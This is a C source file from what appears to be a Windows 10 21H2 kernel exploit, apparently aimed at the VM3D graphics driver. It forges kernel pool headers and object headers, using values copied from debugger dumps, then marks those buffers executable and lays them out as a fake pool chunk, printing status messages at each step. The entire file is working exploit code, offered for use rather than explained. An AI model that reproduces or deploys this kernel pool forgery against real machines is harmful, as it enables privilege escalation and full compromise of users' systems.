#include "exploit.h"

void initialize_pool_header_w10_21H2(PPOOL_HEADER input_pool_header)
{
	POOL_HEADER pool_header = *input_pool_header; // dt nt!_POOL_HEADER ffffb004f4040300

	pool_header.PreviousSize = 0;
	pool_header.PoolIndex = 0xBA;
	pool_header.BlockSize = 0x3;
	pool_header.PoolType = 0x2;
	pool_header.Ulong1 = 0x203BA00;
	pool_header.PoolTag = 0x44334D56;
	pool_header.ProcessBilled = 0;
	pool_header.AllocatorBackTraceIndex = 0x89CE;
	pool_header.PoolTagHash = 0x246C;

	*input_pool_header = pool_header;
}

void initialize_object_header_quota_w10_21H2(POBJECT_HEADER_QUOTA_INFO input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO object_header_quota_info = *input_object_header_quota; // dt nt!_OBJECT_HEADER_QUOTA_INFO ffffb004f4040300+C

	object_header_quota_info.PagedPoolCharge = 0x1646E820;
	object_header_quota_info.NonPagedPoolCharge = 0xBB444000;
	object_header_quota_info.SecurityDescriptorCharge = 0xFFFF9E00;
	object_header_quota_info.Reserved1 = 0xF9F489F0;
	object_header_quota_info.SecurityDescriptorQuotaBlock = (void*)0x00000000FFFFB004;
	object_header_quota_info.Reserved2 = 0x61E8000000000000;

	*input_object_header_quota = object_header_quota_info;
}

void initialize_ex_push_lock_w10_21H2(PEX_PUSH_LOCK input_ex_push_lock)
{
	EX_PUSH_LOCK ex_push_lock = *input_ex_push_lock; // dx -id 0,0,ffffb004f3661040 -r1 (*((ntkrnlmp!_EX_PUSH_LOCK *)0xffffb004f404033c))

	ex_push_lock.Locked = 0x0;
	ex_push_lock.Waiting = 0x0;
	ex_push_lock.Waking = 0x0;
	ex_push_lock.MultipleShared = 0x0;
	ex_push_lock.Shared = 0x13B41000;
	ex_push_lock.Value = 0x13B410000;
	ex_push_lock.Ptr = (void*)0x13B410000;

	*input_ex_push_lock = ex_push_lock;
}

void initialize_quad_w10_21H2(PQUAD input_quad)
{
	QUAD quad = *input_quad; // dx -id 0,0,ffffb004f3661040 -r1 (*((ntkrnlmp!_QUAD *)0xffffb004f404035c))

	quad.UseThisFieldToCopy = 144973907877691392;
	quad.DoNotUseThisField = 0.000000;

	*input_quad = quad;
}

// In the VM3D pool chunk structures, it appears that the OBJECT_CREATE_INFORMATION structure is unused.
// We will keep this here incase anyone would like to use it for anything.
void initialize_object_create_information_w10_21H2(POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_CREATE_INFORMATION object_create_information = *input_object_create_information;

	*input_object_create_information = object_create_information;
}

void initialize_object_header_w10_21H2(POBJECT_HEADER input_object_header, PEX_PUSH_LOCK input_ex_push_lock, PVOID input_heap_allocation_address, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information)
{
	OBJECT_HEADER object_header = *input_object_header; // dt nt!_OBJECT_HEADER ffffb004f4040300+C+20

	object_header.PointerCount = 144960713608134749;
	object_header.HandleCount = 108513067374234694;
	object_header.NextToFree = (void*)0x0181840F52544C46;
	object_header.Lock = input_ex_push_lock;
	object_header.TypeIndex = 0;
	object_header.TraceFlags = 0;
	object_header.DbgRefTrace = 0;
	object_header.DbgTracePermanent = 0;
	object_header.InfoMask = 0x2;
	object_header.Flags = 0;
	object_header.NewObject = 0;
	object_header.KernelObject = 0;
	object_header.KernelOnlyAccess = 0;
	object_header.ExclusiveObject = 0;
	object_header.PermanentObject = 0;
	object_header.DefaultSecurityQuota = 0;
	object_header.SingleHandleEntry = 0;
	object_header.DeletedInline = 0;
	object_header.Reserved = 0;
	object_header.ObjectCreateInfo = 0;
	object_header.QuotaBlockCharged = 0;
	object_header.SecurityDescriptor = 0xBBBF000000000000;
	object_header.Body = input_quad;

	*input_object_header = object_header;
}

int mark_pool_structs_executable(PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header)
{
	char unused = 0;
	unsigned long old_protection = 0;

	if (!VirtualProtect(input_pool_header, sizeof(POOL_HEADER), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the pool header structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the pool header structure as read+write+executable.");

	if (!VirtualProtect(input_object_header_quota, sizeof(OBJECT_HEADER_QUOTA_INFO), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the object header quota info structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the object header quota info structure as read+write+executable.");

	if (!VirtualProtect(input_push_lock, sizeof(EX_PUSH_LOCK), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the push lock structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the push lock structure as read+write+executable.");

	if (!VirtualProtect(input_quad, sizeof(QUAD), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the quad structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the quad structure as read+write+executable.");

	if (!VirtualProtect(input_object_create_information, sizeof(OBJECT_CREATE_INFORMATION), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the object create information structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the object create information structure as read+write+executable.");

	if (!VirtualProtect(input_object_header, sizeof(OBJECT_HEADER), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the object header structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the object header structure as read+write+executable.");

	return 0;
}

void initialize_main_pool_structs_w10_21H2(char* address, PPOOL_HEADER input_pool_header, POBJECT_HEADER_QUOTA_INFO input_object_header_quota, PEX_PUSH_LOCK input_push_lock, PQUAD input_quad, POBJECT_CREATE_INFORMATION input_object_create_information, POBJECT_HEADER input_object_header)
{
	initialize_pool_header_w10_21H2(input_pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota_w10_21H2(input_object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_ex_push_lock_w10_21H2(input_push_lock);
	printf("\n[+] Initialized fake push lock.");

	initialize_quad_w10_21H2(input_quad);
	printf("\n[+] Initialized fake quad.");

	initialize_object_create_information_w10_21H2(input_object_create_information);
	printf("\n[+] Initialized fake object create information.");

	initialize_object_header_w10_21H2(input_object_header, input_push_lock, address, input_quad, input_object_create_information);
	printf("\n[+] Initialized fake object header.");
}

void build_pool_chunk_w10_21H2(char* fake_pool_memory_page, POOL_HEADER pool_header, OBJECT_HEADER_QUOTA_INFO object_header_quota_info, OBJECT_HEADER object_header)
{
	// Pool Header Construction
	*(PUCHAR)(fake_pool_memory_page) = pool_header.PreviousSize;
	*(PUCHAR)(fake_pool_memory_page + 1) = pool_header.PoolIndex;
	*(PUCHAR)(fake_pool_memory_page + 2) = pool_header.BlockSize;
	*(PUCHAR)(fake_pool_memory_page + 3) = pool_header.PoolType;
	*(PULONG)(fake_pool_memory_page + 4) = pool_header.Ulong1; // TODO: Remove this from the pool chunk construction...
	*(PULONG)(fake_pool_memory_page + 8) = pool_header.PoolTag;
	*(PULONGLONG)(fake_pool_memory_page + 12) = pool_header.ProcessBilled;
	*(PUSHORT)(fake_pool_memory_page + 20) = pool_header.AllocatorBackTraceIndex;
	*(PUSHORT)(fake_pool_memory_page + 22) = pool_header.PoolTagHash;
	printf("\n[+] Built pool header.");

	// Object Header Quota Info Construction
	*(PULONG)(fake_pool_memory_page + 24) = object_header_quota_info.PagedPoolCharge;
	*(PULONG)(fake_pool_memory_page + 28) = object_header_quota_info.NonPagedPoolCharge;
	*(PULONG)(fake_pool_memory_page + 32) = object_header_quota_info.SecurityDescriptorCharge;
	*(PULONG)(fake_pool_memory_page + 36) = object_header_quota_info.Reserved1;
	*(PULONGLONG)(fake_pool_memory_page + 40) = object_header_quota_info.SecurityDescriptorQuotaBlock;
	*(PULONGLONG)(fake_pool_memory_page + 48) = object_header_quota_info.Reserved2;
	printf("\n[+] Built object header quota info.");

	// Object Header Construction
	*(PLONGLONG)(fake_pool_memory_page + 56) = object_header.PointerCount;
	*(PLONGLONG)(fake_pool_memory_page + 64) = object_header.HandleCount;
	*(PULONGLONG)(fake_pool_memory_page + 72) = object_header.NextToFree;
	*(PULONGLONG)(fake_pool_memory_page + 80) = object_header.Lock;
	*(PUCHAR)(fake_pool_memory_page + 88) = object_header.TypeIndex;
	*(PUCHAR)(fake_pool_memory_page + 89) = object_header.TraceFlags;
	*(PUCHAR)(fake_pool_memory_page + 90) = object_header.DbgRefTrace;
	*(PUCHAR)(fake_pool_memory_page + 91) = object_header.DbgTracePermanent;
	*(PUCHAR)(fake_pool_memory_page + 92) = object_header.InfoMask;
	*(PUCHAR)(fake_pool_memory_page + 93) = object_header.Flags;
	*(PUCHAR)(fake_pool_memory_page + 94) = object_header.NewObject;
	*(PUCHAR)(fake_pool_memory_page + 95) = object_header.KernelObject;
	*(PUCHAR)(fake_pool_memory_page + 96) = object_header.KernelOnlyAccess;
	*(PUCHAR)(fake_pool_memory_page + 97) = object_header.ExclusiveObject;
	*(PUCHAR)(fake_pool_memory_page + 98) = object_header.PermanentObject;
	*(PUCHAR)(fake_pool_memory_page + 99) = object_header.DefaultSecurityQuota;
	*(PUCHAR)(fake_pool_memory_page + 100) = object_header.SingleHandleEntry;
	*(PUCHAR)(fake_pool_memory_page + 101) = object_header.DeletedInline;
	*(PULONG)(fake_pool_memory_page + 102) = object_header.Reserved;
	*(PULONGLONG)(fake_pool_memory_page + 106) = object_header.ObjectCreateInfo;
	*(PULONGLONG)(fake_pool_memory_page + 114) = object_header.QuotaBlockCharged;
	*(PULONGLONG)(fake_pool_memory_page + 122) = object_header.SecurityDescriptor;
	*(PULONGLONG)(fake_pool_memory_page + 130) = object_header.Body;
	printf("\n[+] Built object header.");
}